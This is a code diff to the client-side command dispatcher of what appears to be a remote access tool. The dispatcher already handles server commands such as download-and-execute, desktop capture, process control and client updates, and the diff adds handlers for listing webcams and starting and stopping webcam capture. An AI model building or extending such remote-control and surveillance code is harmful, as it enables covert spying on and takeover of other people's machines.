@@ -9,7 +9,6 @@ namespace xClient.Core.Packets
         public static void HandlePacket(Client client, IPacket packet)
         {
             var type = packet.GetType();
-
             if (type == typeof(ServerPackets.DoDownloadAndExecute))
             {
                 CommandHandler.HandleDoDownloadAndExecute((ServerPackets.DoDownloadAndExecute)packet,
@@ -39,6 +38,10 @@ namespace xClient.Core.Packets
             {
                 CommandHandler.HandleGetDesktop((ServerPackets.GetDesktop)packet, client);
             }
+            else if (type == typeof(ServerPackets.GetWebcam))
+            {
+                CommandHandler.HandleGetWebcam((ServerPackets.GetWebcam)packet, client);
+            }
             else if (type == typeof(ServerPackets.GetProcesses))
             {
                 CommandHandler.HandleGetProcesses((ServerPackets.GetProcesses)packet, client);
@@ -46,6 +49,10 @@ namespace xClient.Core.Packets
             else if (type == typeof(ServerPackets.DoProcessKill))
             {
                 CommandHandler.HandleDoProcessKill((ServerPackets.DoProcessKill)packet, client);
+            }
+            else if (type == typeof(ServerPackets.DoWebcamStop))
+            {
+                CommandHandler.HandleDoWebcamStop((ServerPackets.DoWebcamStop)packet, client);
             }
             else if (type == typeof(ServerPackets.DoProcessStart))
             {
@@ -90,6 +97,10 @@ namespace xClient.Core.Packets
             else if (type == typeof(ServerPackets.DoClientUpdate))
             {
                 CommandHandler.HandleDoClientUpdate((ServerPackets.DoClientUpdate)packet, client);
+            }
+            else if (type == typeof(ServerPackets.GetWebcams))
+            {
+                CommandHandler.HandleGetWebcams((ServerPackets.GetWebcams)packet, client);
             }
             else if (type == typeof(ServerPackets.GetMonitors))
             {
